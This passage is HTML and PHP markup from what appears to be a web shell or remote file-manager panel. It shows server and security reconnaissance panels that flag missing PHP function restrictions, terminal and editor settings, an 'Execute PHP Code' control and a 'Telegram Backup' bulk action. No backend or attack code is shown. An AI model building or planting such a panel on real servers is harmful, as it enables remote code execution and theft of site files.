                                        <span class="text-base text-gray-900 dark:text-white"><?php echo ini_get('post_max_size'); ?></span>
                                    </div>
                                    <div class="flex flex-col">
                                        <span class="text-sm font-medium text-gray-500 dark:text-gray-400">Display Errors</span>
                                        <span class="text-base text-gray-900 dark:text-white"><?php echo ini_get('display_errors') ? 'Enabled' : 'Disabled'; ?></span>
                                    </div>
                                    <div class="flex flex-col">
                                        <span class="text-sm font-medium text-gray-500 dark:text-gray-400">Error Reporting</span>
                                        <span class="text-base text-gray-900 dark:text-white"><?php echo error_reporting(); ?></span>
                                    </div>
                                </div>
                            </div>
                            
                            <!-- User Information -->
                            <div class="bg-white dark:bg-gray-700 rounded-lg shadow p-6 animate-fadeIn animation-delay-400">
                                <h3 class="text-lg font-semibold mb-4 text-gray-900 dark:text-white flex items-center">
                                    <i class="fas fa-user-shield mr-2 text-green-500"></i> User Information
                                </h3>
                                <div class="space-y-3">
                                    <div class="flex flex-col">
                                        <span class="text-sm font-medium text-gray-500 dark:text-gray-400">Current User</span>
                                        <span class="text-base text-gray-900 dark:text-white"><?php echo get_current_user(); ?></span>
                                    </div>
                                    <div class="flex flex-col">
                                        <span class="text-sm font-medium text-gray-500 dark:text-gray-400">User ID</span>
                                        <span class="text-base text-gray-900 dark:text-white"><?php echo getmyuid(); ?></span>
                                    </div>
                                    <div class="flex flex-col">
                                        <span class="text-sm font-medium text-gray-500 dark:text-gray-400">Group ID</span>
                                        <span class="text-base text-gray-900 dark:text-white"><?php echo getmygid(); ?></span>
                                    </div>
                                    <div class="flex flex-col">
                                        <span class="text-sm font-medium text-gray-500 dark:text-gray-400">Process ID</span>
                                        <span class="text-base text-gray-900 dark:text-white"><?php echo getmypid(); ?></span>
                                    </div>
                                    <div class="flex flex-col">
                                        <span class="text-sm font-medium text-gray-500 dark:text-gray-400">Client IP</span>
                                        <span class="text-base text-gray-900 dark:text-white"><?php echo $_SERVER['REMOTE_ADDR'] ?? 'Unknown'; ?></span>
                                    </div>
                                    
                                </div>
                            </div>
                            
                            <!-- Security Information -->
                            <div class="bg-white dark:bg-gray-700 rounded-lg shadow p-6 animate-fadeIn animation-delay-600">
                                <h3 class="text-lg font-semibold mb-4 text-gray-900 dark:text-white flex items-center">
                                    <i class="fas fa-shield-alt mr-2 text-red-500"></i> Security Information
                                </h3>
                                <div class="space-y-3">
                                    <div class="flex flex-col">
                                        <span class="text-sm font-medium text-gray-500 dark:text-gray-400">Disabled Functions</span>
                                        <div class="text-base text-gray-900 dark:text-white break-all">
                                            <?php 
                                            $disabled = ini_get('disable_functions');
                                            if (empty($disabled)) {
                                                echo '<span class="text-red-500">No functions disabled!</span>';
                                            } else {
                                                $functions = explode(',', $disabled);
                                                echo '<div class="max-h-32 overflow-y-auto">';
                                                foreach ($functions as $function) {
                                                    echo '<span class="inline-block bg-gray-200 dark:bg-gray-600 rounded px-2 py-1 text-sm mr-1 mb-1">' . trim($function) . '</span>';
                                                }
                                                echo '</div>';
                                            }
                                            ?>
                                        </div>
                                    </div>
                                    <div class="flex flex-col">
                                        <span class="text-sm font-medium text-gray-500 dark:text-gray-400">Safe Mode</span>
                                        <span class="text-base text-gray-900 dark:text-white">
                                            <?php 
                                            $safeMode = ini_get('safe_mode');
                                            echo $safeMode ? '<span class="text-green-500">Enabled</span>' : '<span class="text-red-500">Disabled</span>';
                                            ?>
                                        </span>
                                    </div>
                                    <div class="flex flex-col">
                                        <span class="text-sm font-medium text-gray-500 dark:text-gray-400">Open Basedir</span>
                                        <span class="text-base text-gray-900 dark:text-white break-all">
                                            <?php 
                                            $openBasedir = ini_get('open_basedir');
                                            echo empty($openBasedir) ? '<span class="text-red-500">Not restricted</span>' : $openBasedir;
                                            ?>
                                        </span>
                                    </div>
                                    <div class="flex flex-col">
                                        <span class="text-sm font-medium text-gray-500 dark:text-gray-400">Allow URL fopen</span>
                                        <span class="text-base text-gray-900 dark:text-white">
                                            <?php echo ini_get('allow_url_fopen') ? '<span class="text-yellow-500">Enabled</span>' : '<span class="text-green-500">Disabled</span>'; ?>
                                        </span>
                                    </div>
                                    <div class="flex flex-col">
                                        <span class="text-sm font-medium text-gray-500 dark:text-gray-400">Allow URL include</span>
                                        <span class="text-base text-gray-900 dark:text-white">
                                            <?php echo ini_get('allow_url_include') ? '<span class="text-red-500">Enabled</span>' : '<span class="text-green-500">Disabled</span>'; ?>
                                        </span>
                                    </div>
                                </div>
                            </div>
                        </div>
                        
                        <!-- Loaded Extensions -->
                        <div class="mt-6 bg-white dark:bg-gray-700 rounded-lg shadow p-6 animate-fadeIn">
                            <h3 class="text-lg font-semibold mb-4 text-gray-900 dark:text-white flex items-center">
                                <i class="fas fa-puzzle-piece mr-2 text-purple-500"></i> Loaded PHP Extensions
                            </h3>
                            <div class="flex flex-wrap gap-2">
                                <?php
                                $extensions = get_loaded_extensions();
                                sort($extensions);
                                foreach ($extensions as $extension) {
                                    echo '<span class="inline-block bg-gray-200 dark:bg-gray-600 rounded px-2 py-1 text-sm text-gray-900 dark:text-white">' . $extension . '</span>';
                                }
                                ?>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="hidden p-4 rounded-lg bg-white dark:bg-gray-800" id="setting" role="tabpanel"
                    aria-labelledby="setting-tab">
                    <div class="max-w-4xl mx-auto">
                        <h2 class="text-xl font-bold mb-6 text-gray-900 dark:text-white">Settings</h2>
                        
                        <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                            <!-- Appearance Settings -->
                            <div class="bg-white dark:bg-gray-700 rounded-lg shadow p-6 animate-fadeIn settings-section">
                                <h3 class="text-lg font-semibold mb-4 text-gray-900 dark:text-white">
                                    <i class="fas fa-paint-brush mr-2 text-blue-500"></i> Appearance
                                </h3>
                                <div class="space-y-4">
                                    <!-- Theme Selection -->
                                    <div>
                                        <label class="flex items-center justify-between text-sm font-medium text-gray-700 dark:text-gray-300">
                                            <span>Theme</span>
                                            <div class="flex space-x-2">
                                                <button id="light-theme-btn" class="p-2 bg-gray-100 rounded-full hover:bg-gray-200 transition-colors">
                                                    <i class="fas fa-sun text-yellow-500"></i>
                                                </button>
                                                <button id="dark-theme-btn" class="p-2 bg-gray-700 rounded-full hover:bg-gray-800 transition-colors">
                                                    <i class="fas fa-moon text-gray-400"></i>
                                                </button>
                                                <button id="system-theme-btn" class="p-2 bg-gray-300 dark:bg-gray-600 rounded-full hover:bg-gray-400 dark:hover:bg-gray-500 transition-colors">
                                                    <i class="fas fa-desktop text-gray-700 dark:text-gray-300"></i>
                                                </button>
                </div>
                                        </label>
                                    </div>
                                    
                                  
                                    <!-- Font Settings -->
                                    <div>
                                        <label for="font-size" class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Interface Font Size</label>
                                        <input id="font-size" type="range" min="12" max="20" value="14" class="w-full h-2 bg-gray-200 rounded-lg appearance-none cursor-pointer dark:bg-gray-700">
                                        <div class="flex justify-between text-xs text-gray-600 dark:text-gray-400 mt-1">
                                            <span>12px</span>
                                            <span>14px</span>
                                            <span>20px</span>
                                        </div>
                                    </div>

                                    <!-- Animation Settings -->
                                    <div class="flex items-center">
                                        <input id="enable-animations" type="checkbox" checked class="w-4 h-4 text-blue-600 bg-gray-100 border-gray-300 rounded focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 dark:focus:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                        <label for="enable-animations" class="ms-2 text-sm font-medium text-gray-700 dark:text-gray-300">Enable UI Animations</label>
                                    </div>
                                </div>
                            </div>
                            
                            <!-- File Manager Settings -->
                            <div class="bg-white dark:bg-gray-700 rounded-lg shadow p-6 animate-fadeIn animation-delay-200">
                                <h3 class="text-lg font-semibold mb-4 text-gray-900 dark:text-white">
                                    <i class="fas fa-folder-open mr-2 text-green-500"></i> File Manager
                                </h3>
                                <div class="space-y-4">
                                    <!-- Default View -->
                                    <div>
                                        <label for="default-view" class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Default View</label>
                                        <select id="default-view" class="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white">
                                            <option value="list">List View</option>
                                            <option value="grid">Grid View</option>
                                        </select>
                                    </div>
                                    
                                    <!-- Items Per Page -->
                                    <div>
                                        <label for="default-items" class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Default Items Per Page</label>
                                        <select id="default-items" class="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white">
                                            <option value="10">10 Items</option>
                                            <option value="20">20 Items</option>
                                            <option value="50" selected>50 Items</option>
                                            <option value="100">100 Items</option>
                                            <option value="all">All Items</option>
                                        </select>
                                    </div>
                                    
                                    <!-- Show Hidden Files -->
                                    <div class="flex items-center">
                                        <input id="show-hidden" type="checkbox" class="w-4 h-4 text-blue-600 bg-gray-100 border-gray-300 rounded focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 dark:focus:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                        <label for="show-hidden" class="ms-2 text-sm font-medium text-gray-700 dark:text-gray-300">Show Hidden Files</label>
                                    </div>
                                </div>
                            </div>
                            
                            <!-- Terminal Settings -->
                            <div class="bg-white dark:bg-gray-700 rounded-lg shadow p-6 animate-fadeIn animation-delay-400">
                                <h3 class="text-lg font-semibold mb-4 text-gray-900 dark:text-white">
                                    <i class="fas fa-terminal mr-2 text-purple-500"></i> Terminal
                                </h3>
                                <div class="space-y-4">
                                    <!-- Terminal Theme -->
                                    <div>
                                        <label for="terminal-theme" class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Terminal Theme</label>
                                        <select id="terminal-theme" class="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white">
                                            <option value="dark">Dark</option>
                                            <option value="light">Light</option>
                                            <option value="system">Match System</option>
                                        </select>
                                    </div>
                                    
                                    <!-- Terminal Font Size -->
                                    <div>
                                        <label for="terminal-font-size" class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Terminal Font Size</label>
                                        <input id="terminal-font-size" type="range" min="10" max="20" value="14" class="w-full h-2 bg-gray-200 rounded-lg appearance-none cursor-pointer dark:bg-gray-700">
                                        <div class="flex justify-between text-xs text-gray-600 dark:text-gray-400 mt-1">
                                            <span>10px</span>
                                            <span>14px</span>
                                            <span>20px</span>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            
                            <!-- Editor Settings -->
                            <div class="bg-white dark:bg-gray-700 rounded-lg shadow p-6 animate-fadeIn animation-delay-600">
                                <h3 class="text-lg font-semibold mb-4 text-gray-900 dark:text-white">
                                    <i class="fas fa-code mr-2 text-amber-500"></i> Code Editor
                                </h3>
                                <div class="space-y-4">
                                    <!-- Editor Theme -->
                                    <div>
                                        <label for="editor-theme" class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Editor Theme</label>
                                        <select id="editor-theme" class="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white">
                                            <option value="system">Match System Theme</option>
                                            <option value="vs">Visual Studio (Light)</option>
                                            <option value="vs-dark">Visual Studio Dark</option>
                                            <option value="dracula">Dracula</option>
                                            <option value="eclipse">Eclipse</option>
                                        </select>
                                    </div>
                                    
                                    <!-- Tab Size -->
                                    <div>
                                        <label for="tab-size" class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Tab Size</label>
                                        <select id="tab-size" class="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white">
                                            <option value="2">2 spaces</option>
                                            <option value="4" selected>4 spaces</option>
                                            <option value="8">8 spaces</option>
                                        </select>
                                    </div>

                                    <!-- Editor Options -->
                                    <div class="space-y-2">
                                        <div class="flex items-center">
                                            <input id="word-wrap" type="checkbox" checked class="w-4 h-4 text-blue-600 bg-gray-100 border-gray-300 rounded focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 dark:focus:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                            <label for="word-wrap" class="ms-2 text-sm font-medium text-gray-700 dark:text-gray-300">Enable Word Wrap</label>
                                        </div>
                                        <div class="flex items-center">
                                            <input id="auto-close-brackets" type="checkbox" checked class="w-4 h-4 text-blue-600 bg-gray-100 border-gray-300 rounded focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 dark:focus:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                            <label for="auto-close-brackets" class="ms-2 text-sm font-medium text-gray-700 dark:text-gray-300">Auto-close Brackets</label>
                                        </div>
                                        <div class="flex items-center">
                                            <input id="highlight-active-line" type="checkbox" checked class="w-4 h-4 text-blue-600 bg-gray-100 border-gray-300 rounded focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 dark:focus:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                            <label for="highlight-active-line" class="ms-2 text-sm font-medium text-gray-700 dark:text-gray-300">Highlight Active Line</label>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <!-- Keyboard Shortcuts -->
                            <div class="bg-white dark:bg-gray-700 rounded-lg shadow p-6 animate-fadeIn animation-delay-800 md:col-span-2">
                                <h3 class="text-lg font-semibold mb-4 text-gray-900 dark:text-white">
                                    <i class="fas fa-keyboard mr-2 text-indigo-500"></i> Keyboard Shortcuts
                                </h3>
                                <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                                    <!-- File Operations -->
                                    <div>
                                        <h4 class="font-medium text-sm text-gray-700 dark:text-gray-300 mb-2">File Operations</h4>
                                        <div class="space-y-2 text-sm">
                                            <div class="flex justify-between items-center">
                                                <span class="text-gray-600 dark:text-gray-400">New File</span>
                                                <kbd class="px-2 py-1 bg-gray-100 dark:bg-gray-600 rounded text-gray-800 dark:text-gray-200">Ctrl + N</kbd>
                                            </div>
                                            <div class="flex justify-between items-center">
                                                <span class="text-gray-600 dark:text-gray-400">Save File</span>
                                                <kbd class="px-2 py-1 bg-gray-100 dark:bg-gray-600 rounded text-gray-800 dark:text-gray-200">Ctrl + S</kbd>
                                            </div>
                                            <div class="flex justify-between items-center">
                                                <span class="text-gray-600 dark:text-gray-400">Close Tab</span>
                                                <kbd class="px-2 py-1 bg-gray-100 dark:bg-gray-600 rounded text-gray-800 dark:text-gray-200">Ctrl + W</kbd>
                                            </div>
                                            <div class="flex justify-between items-center">
                                                <span class="text-gray-600 dark:text-gray-400">Copy</span>
                                                <kbd class="px-2 py-1 bg-gray-100 dark:bg-gray-600 rounded text-gray-800 dark:text-gray-200">Ctrl + C</kbd>
                                            </div>
                                            <div class="flex justify-between items-center">
                                                <span class="text-gray-600 dark:text-gray-400">Cut</span>
                                                <kbd class="px-2 py-1 bg-gray-100 dark:bg-gray-600 rounded text-gray-800 dark:text-gray-200">Ctrl + X</kbd>
                                            </div>
                                            <div class="flex justify-between items-center">
                                                <span class="text-gray-600 dark:text-gray-400">Paste</span>
                                                <kbd class="px-2 py-1 bg-gray-100 dark:bg-gray-600 rounded text-gray-800 dark:text-gray-200">Ctrl + V</kbd>
                                            </div>
                                        </div>
                                    </div>
                                    
                                    <!-- Navigation -->
                                    <div>
                                        <h4 class="font-medium text-sm text-gray-700 dark:text-gray-300 mb-2">Navigation</h4>
                                        <div class="space-y-2 text-sm">
                                            <div class="flex justify-between items-center">
                                                <span class="text-gray-600 dark:text-gray-400">Quick Open</span>
                                                <kbd class="px-2 py-1 bg-gray-100 dark:bg-gray-600 rounded text-gray-800 dark:text-gray-200">Ctrl + P</kbd>
                                            </div>
                                            <div class="flex justify-between items-center">
                                                <span class="text-gray-600 dark:text-gray-400">Find in Files</span>
                                                <kbd class="px-2 py-1 bg-gray-100 dark:bg-gray-600 rounded text-gray-800 dark:text-gray-200">Ctrl + Shift + F</kbd>
                                            </div>
                                            <div class="flex justify-between items-center">
                                                <span class="text-gray-600 dark:text-gray-400">Switch Tab</span>
                                                <kbd class="px-2 py-1 bg-gray-100 dark:bg-gray-600 rounded text-gray-800 dark:text-gray-200">Ctrl + Tab</kbd>
                                            </div>
                                            <div class="flex justify-between items-center">
                                                <span class="text-gray-600 dark:text-gray-400">Go to Line</span>
                                                <kbd class="px-2 py-1 bg-gray-100 dark:bg-gray-600 rounded text-gray-800 dark:text-gray-200">Ctrl + G</kbd>
                                            </div>
                                            <div class="flex justify-between items-center">
                                                <span class="text-gray-600 dark:text-gray-400">Toggle Terminal</span>
                                                <kbd class="px-2 py-1 bg-gray-100 dark:bg-gray-600 rounded text-gray-800 dark:text-gray-200">Ctrl + `</kbd>
                                            </div>
                                            <div class="flex justify-between items-center">
                                                <span class="text-gray-600 dark:text-gray-400">Toggle Sidebar</span>
                                                <kbd class="px-2 py-1 bg-gray-100 dark:bg-gray-600 rounded text-gray-800 dark:text-gray-200">Ctrl + B</kbd>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        
                        <div class="mt-8 flex justify-end">
                            <button id="save-settings" class="px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors flex items-center">
                                <i class="fas fa-save mr-2"></i> Save Settings
                            </button>
                        </div>
                    </div>
                </div>
             <!-- File manager UI - will be shown/hidden based on tab type -->
             <div id="fileManagerUI" class="p-4 rounded-lg bg-white dark:bg-gray-800">
                <!-- Flowbite tab content -->
                <div class="p-4 rounded-lg bg-white dark:bg-gray-800" id="file" role="tabpanel"
                    aria-labelledby="file-tab">
                    <div class="relative flex w-full items-center gap-4 text-gray-800 dark:text-gray-300 mb-4">
                        <!-- Bulk Actions Dropdown -->
                        <div class="flex items-center space-x-1">
                        <select id="bulkActions" name="bulkActions"
                                class="appearance-none rounded-md border border-gray-500 bg-gray-200 px-2 py-1 text-xs focus:outline-none focus:ring-2 focus:ring-sky-900 disabled:cursor-not-allowed disabled:opacity-75 dark:border-gray-500 dark:bg-gray-800 dark:text-gray-300 dark:focus:ring-sky-400">
                                <option value="" disabled selected>Bulk Actions</option>
                                                            <option value="delete">Delete</option>
                                <option value="zip">Zip</option>
                                <option value="unzip">Unzip</option>
                                <option value="copy">Copy</option>
                                <option value="paste">Paste</option>
                                <option value="cut">Cut</option>
                                <option value="telegram_backup">Telegram Backup</option>
                        </select>
                            <button id="keyboardShortcutsBtn" title="Keyboard Shortcuts (Press ? for help)"
                                class="inline-flex items-center px-3 py-2 text-sm font-medium text-center text-white bg-gray-700 rounded-lg hover:bg-gray-800 focus:ring-4 focus:outline-none focus:ring-gray-300 dark:bg-gray-600 dark:hover:bg-gray-700 dark:focus:ring-gray-800">
                                <i class="fas fa-keyboard"></i>
                            </button>
            </div>
                        <!-- Directory Creation Button -->
                        <i class="fas fa-folder-plus text-blue-600 dark:text-blue-400 cursor-pointer"
                            title="Create Folder"></i>
                        <i class="fas fa-file-circle-plus text-green-600 dark:text-green-400 cursor-pointer"
                            title="Create File"></i>
                        <i class="codeme fa-brands fa-php text-purple-600 dark:text-purple-400 cursor-pointer"
                            title="Execute PHP Code"></i>

 

                        <i class="advanced-search fas fa-search-plus text-orange-600 dark:text-orange-400 cursor-pointer"
                            title="Advanced Search"></i>

                        <!-- Display Options -->
                        <div class="ml-auto flex items-center gap-2">
                            <label for="itemLimit" class="text-xs">Items per page:</label>
                            <select id="itemLimit"
                                class="rounded-md border border-gray-500 bg-gray-200 px-2 py-1 text-xs focus:outline-none focus:ring-2 focus:ring-sky-900 disabled:cursor-not-allowed disabled:opacity-75 dark:border-gray-500 dark:bg-gray-800 dark:text-gray-300 dark:focus:ring-sky-400">
                                <option value="10">10</option>
                                <option value="20">20</option>
                                <option value="50" selected>50</option>
                                <option value="100">100</option>
                                <option value="all">All</option>
                            </select>
                        </div>
                    </div>

                    <div class="overflow-x-auto">
                        <table
                            class="w-full text-sm text-left text-gray-500 dark:text-gray-400 rounded-lg overflow-hidden">
                            <thead
                                class="text-xs text-gray-700 uppercase bg-gray-50 dark:bg-gray-700 dark:text-gray-400">
                                <tr>
                                    <th scope="col" class="p-4">
                                        <div class="flex items-center">
                                            <input id="selectAll" type="checkbox"
                                                class="w-4 h-4 text-blue-600 bg-gray-100 border-gray-300 rounded focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 dark:focus:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                            <label for="selectAll" class="sr-only">checkbox</label>
                            </div>
                                </th>
                                    <th scope="col" class="px-6 py-3 cursor-pointer" data-sort="name">
                                        Name
                                        <i class="fas fa-sort ml-1"></i>
                                    </th>
                                    <th scope="col" class="px-6 py-3 cursor-pointer" data-sort="size">
                                        Size
                                        <i class="fas fa-sort ml-1"></i>
                                    </th>
                                    <th scope="col" class="px-6 py-3 cursor-pointer" data-sort="mtime">
                                        Modified
                                        <i class="fas fa-sort ml-1"></i>
                                    </th>
                                    <th scope="col" class="px-6 py-3 cursor-pointer" data-sort="owner">
                                        Owner
                                        <i class="fas fa-sort ml-1"></i>
                                    </th>
                                    <th scope="col" class="px-6 py-3 cursor-pointer" data-sort="perms" title="Green: Writable, Red: Not writable">
                                        Permissions
                                        <i class="fas fa-sort ml-1"></i>
                                    </th>
                                    <th scope="col" class="px-6 py-3">
                                        Actions
                                    </th>
                            </tr>
                        </thead>
                            <tbody id="fileList">
                                <!-- Files will be dynamically inserted here -->
                        </tbody>
                    </table>
                </div>
                </div>
            </div>

        </div>
    </div>

  
</body>
</html>
